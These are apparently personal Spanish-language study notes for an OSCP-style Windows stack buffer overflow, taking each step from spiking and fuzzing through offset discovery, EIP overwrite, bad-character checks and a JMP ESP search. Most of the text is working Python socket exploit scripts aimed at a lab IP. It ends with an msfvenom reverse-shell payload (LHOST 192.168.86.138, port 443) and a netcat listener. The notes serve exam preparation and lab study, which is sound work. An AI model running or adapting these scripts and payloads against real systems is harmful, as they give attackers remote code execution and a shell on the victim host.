
# Cosas basicas

Cargar el binario vulnerable

1º Cierras todo
2º ejecutas el binario
3º cargas el binario en el debugger
4º inicias el programa

# Spiking

Script de spiking de Bof
[https://spartan-cybersecurity.gitbook.io/oscp-notes/buffer-overflow/windows/spiking](https://spartan-cybersecurity.gitbook.io/oscp-notes/buffer-overflow/windows/spiking)

Codigo del spiking 
~~~~c
s_readline():
s_string("FUNCION ");
s_string_variable("0");
~~~~
NOTA: Intercambiar Funcion por la el nombre de la funcion

1º Con el codigo configurado enviar este comando para que el binario vulnerable pete
~~~~c
>> generic_send_tcp IPVICTIMA PUERTO func.spk 0 0
~~~~

# Fuzzing

En esta fase vamos a buscar el byte mas cercano donde el binario peta

Script de fuzzing
[https://spartan-cybersecurity.gitbook.io/oscp-notes/buffer-overflow/windows/fuzzing](https://spartan-cybersecurity.gitbook.io/oscp-notes/buffer-overflow/windows/fuzzing)

Contenido del script
~~~~python
#!/usr/bin/python2.7
import sys, socket
from time import sleep
buffer = "A" * 100
# Si el binario no se crashea aumenta el valor de 100 a 1000-2000-3000

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('10.10.10.111',3000))
		s.send(('FUNCION /.:/' + buffer))
		#s.send((buffer))
		#s.send((buffer+'\n'))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100
	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()
~~~~
NOTA: Parametros a cambiar serian:
	1º IP
	2º Puerto
	3º Funcion

# Buscar el Offset

1º Generar el patron de bytes para petar el offset
~~~~c
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l VALFUZZ(2800)
~~~~

Script link:
[https://spartan-cybersecurity.gitbook.io/oscp-notes/buffer-overflow/windows/finding-the-offset](https://spartan-cybersecurity.gitbook.io/oscp-notes/buffer-overflow/windows/finding-the-offset)

Script:
~~~~python
#!/usr/bin/python2.7
import sys, socket

offset = "RESULTADO DE COMANDO ANTERIOR"

while True:
try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.10.10.111',3000))
	s.send(('FUNCION /.:/' + offset))
	s.close()

except:
	print "Error connecting to server"
	sys.exit()
~~~~
NOTA: Mismos parametros a editar sumado al resultado del comando anterior

2º Ejecutar este codigo y esperar que el programa pete y/o Error connecting to the server

3º Copiar valor del EIP

4º Copiar Valor del EIP

5º Con el valor del EIP lo copiamos al 2º comando depues del valor -q

6º El offset deberia aparecer
~~~~c
>> /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3800 -q 386F4337 #(EIP del Immunity Debbuger)
~~~~


# Overwriting the EIP
1º En este paso vamos a comprobar que el valor del EIP sea correcto EL VALOR TIENE QUE DAR 4242424242
https://spartan-cybersecurity.gitbook.io/oscp-notes/buffer-overflow/windows/overwriting-the-eip

2º Sobreescribir los valores de siempre en este codigo
~~~~python
#!/usr/bin/python2.7
import sys, socket

shellcode = "A" * VALOR_DEL_OFFSET + "B" * 4 #(valor del paso anterior)

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('10.10.10.111',3000))
		s.send(('FUNCION /.:/' + shellcode))
		s.close()

	except:
		print "Error connecting to server"
		sys.exit()
~~~~

El resultado del EIP tiene que ser 424242
# Finding Bad Characters

1º El codigo se va a ir modificando a medida que completemos los pasos
[https://spartan-cybersecurity.gitbook.io/oscp-notes/buffer-overflow/windows/finding-the-bad-charaters](https://spartan-cybersecurity.gitbook.io/oscp-notes/buffer-overflow/windows/finding-the-bad-charaters)

2º Copiamos el codigo y modificamos los valores (VALOR_DEL_OFFSET, IP, PUERTO, FUNCION)
~~~~python
#!/usr/bin/python2.7

import sys, socket
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A" * VALOR_DEL_OFFSET + "B" * 4 + badchars

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('10.10.10.111',3000))
		s.send(('FUNCION /.:/' + shellcode))
		s.close()

	except:
		print "Error connecting to server"
		sys.exit()
~~~~

## Pasos de expotacion

### 1º set de badchars

1º Se ejcuta el script
2º en inmunnity debugger ejecutamos `!mona config -set workingfolder RUTAWORKSPACE` Para configurar el entorno de trabajo
3º Ejecutamos `!mona bytearray -b "\x00"`
4º Vamos a window > CPU
4.1º Copiamos el valor del ESP en un bloc de notas
5º Ejecutamos `!mona compare -f RUTAWORKSPACE\bytearray.bin -a ESP`
6º Se genera una una ventana de dialogo y daremos click derecho > copy > badchars

### 2º Set de Badchars
Vamos a limpiar de falsos positivos (se suelen detectar por valores seguidos >> 11 12)

1º Vamos a ir desclasificando los numeros pero el 1º lo hemos limpiado

En este ejemplo tenemos esta cadena

00 11 12 40 41 5f 60 b8 b9 ee ef
El primer par ya esta limpio (\x00) asi que vamos a añadirle a ese par el siguiente par (\x00\x11)

Tambien en el script vamos a ir quitando los barchars de la cadena para ir examinandolos

2º Ejecutamos el script hasta que salte el error y el sistema pete
3º En cada crash copiamos el ESP y lo guardamos en un bloc
4º Ejecutamos `!mona bytearray -b “\x00\” (con el byte siguiente al primer par, ej "\x00\x11")`
5º Ejecutamos `!mona compare -f RUTAWORKSPACE\bytearray.bin -a ESP (con el anterior ESP copiado)`

Los badchars definitivos seran los ultimos badchars que nos han dado antes de la limpieza

# Find the right module

Link del script: [https://spartan-cybersecurity.gitbook.io/oscp-notes/buffer-overflow/windows/finding-the-right-module](https://spartan-cybersecurity.gitbook.io/oscp-notes/buffer-overflow/windows/finding-the-right-module)

1º Ejecutamos en el debugger `!mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"`
Y el resultado sera la direccion
NOTA: Tenemos que desmaximizar la ventana para ver el resultado

Script:
~~~~python
#!/usr/bin/python2.7
import sys, socket

shellcode = "A" * VALOR_DEL_OFFSET + "\xAF\x11\x50\x62" 
while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('10.10.10.111',3000))

        s.send(('FUNCION /.:/' + shellcode))
        s.close()

    except:
        print "Server error"
        sys.exit()
~~~~

2º Con la direccion encontrada editamos los valores de siempre pero tambien tenemos que modificar los badchars del codigo
![[Pasted image 20230215174619.png]]
3ºModificar la addres a la INVERSA=si el numero es 12345678 tenemos que hacer “\x87\x65\x43\x21\”
4º En " Go to address dissasembler lo pulsamos y tenemos que especificar el address (hacerlo 2 veces por si acaso)
5º Tecla F2 en la 1º direccion para colocar un breackpoint (tiene qu ecolorearse
5.1 Ejecutar el script
6º Para validar que lo hemos hecho bien, el EIP despues del crasheo tene que ser igual al Addrs

# Generating the shell

Script del paso: [https://spartan-cybersecurity.gitbook.io/oscp-notes/buffer-overflow/windows/generating-shellcode-and-gaining-shell](https://spartan-cybersecurity.gitbook.io/oscp-notes/buffer-overflow/windows/generating-shellcode-and-gaining-shell)

Ejecutamos 
1º Generamos shell reversa

Los BadChars se especifican despues del -b
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.86.138 LPORT=443 EXITFUNC=thread -f c -a x86 -b “\x00” < badchars`

Y nos deberia dar algo como esto
![[Pasted image 20230215175314.png]]

2º Creamos el script

~~~~python
#!/usr/bin/python2.7

import sys, socket

overflow = ("Resultado msfvenom")

# \xAF\x11\x50\x62 Este valor le sigue al OFFSET

# x90"*32 son valores por defecto

shellcode = "A" * VALOR_DEL_OFFSET + "\xAF\x11\x50\x62" + "\x90"*32 + overflow

while True:
	try:

		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('10.10.10.111',3000))
		s.send(('FUNCION /.:/' + shellcode))
		s.close()

	except:
		print "Server error"
		sys.exit()
~~~~

Y manipulamos los mismos valores pero con algunos especiales

1º Copiamos el generado por msfvenom

2º Cambiar otra vez como en la seccion anterior la direccion

3º Guardamos el output

4º Reverse shell nc -nvlp 443

5º Ejecutamos el script